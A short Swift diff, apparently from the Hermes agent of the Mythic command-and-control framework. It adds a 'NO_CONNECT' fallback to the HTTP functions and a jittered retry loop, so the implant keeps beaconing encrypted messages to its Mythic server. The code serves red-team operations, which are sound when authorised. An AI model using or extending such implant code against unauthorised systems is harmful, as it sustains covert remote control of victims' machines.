@@ -46,7 +46,7 @@ func get(data: String) -> String {
     
     // Perform HTTP Request
     let task = URLSession(configuration: .ephemeral).dataTask(with: request) { data, _, _ in
-         results = String(data: data ?? toData(string: "bad message"), encoding: .utf8)!
+         results = String(data: data ?? toData(string: "NO_CONNECT"), encoding: .utf8)!
         dispatch.leave()
     }
     task.resume()
@@ -95,7 +95,7 @@ func post(data: String) -> String {
     request.httpBody = data.data(using: String.Encoding.utf8);
     // Perform HTTP Request
     let task = URLSession(configuration: .ephemeral).dataTask(with: request) { data, _, _ in
-        results = String(data: data!, encoding: .utf8)!
+        results = String(data: data ?? toData(string: "NO_CONNECT"), encoding: .utf8)!
         dispatch.leave()
     }
     task.resume()
@@ -114,12 +114,22 @@ func sendHermesMessage(jsonMessage: JSON, payloadUUID: Data, decodedAESKey: Data
     let hermesMessage = toBase64(data: payloadUUID + iv + ciphertext + hmac)
 
     // Send message to Mythic
-    var mythicMessage = ""
+    var mythicMessage = "NO_CONNECT"
     if (httpMethod == "get") {
-        mythicMessage = get(data: toBase64URL(base64: hermesMessage))
+        while mythicMessage == "NO_CONNECT" {
+            mythicMessage = get(data: toBase64URL(base64: hermesMessage))
+            if mythicMessage == "NO_CONNECT" {
+                sleepWithJitter()
+            }
+        }
     }
     else {
-        mythicMessage = post(data: hermesMessage)
+        while mythicMessage == "NO_CONNECT" {
+            mythicMessage = post(data: hermesMessage)
+            if mythicMessage == "NO_CONNECT" {
+                sleepWithJitter()
+            }
+        }
     }
 
     // Decode and decrypt Mythic message to JSON string
